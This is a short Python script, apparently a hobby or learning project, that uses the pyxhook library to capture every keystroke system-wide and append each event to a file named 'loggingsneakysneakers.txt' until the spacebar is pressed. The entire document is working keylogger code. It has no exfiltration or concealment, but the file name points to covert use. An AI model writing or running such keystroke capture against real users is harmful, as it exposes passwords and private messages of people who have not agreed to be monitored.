#import libraries

import pyxhook
import time
import sys

#Key press function

def kbevent( event ):
    try:
        #print key info
        print(event)
        butts = open("loggingsneakysneakers.txt", "a")
        butts.write(str(event))
        butts.close()
    
        #If the ascii value matches spacebar, terminate the while loop

        if event.Ascii == 32:
            global running
            running = False
    except IOError:
        print("Permission denied! Run with sudo!")

#Create hookmanager
hookman = pyxhook.HookManager()
hookman.KeyDown = kbevent
hookman.HookKeyboard()
hookman.start()
    
#Create a loop to keep the application running
running = True
while running:
    time.sleep(0.1)

#Close the listener when we are done
hookman.cancel()
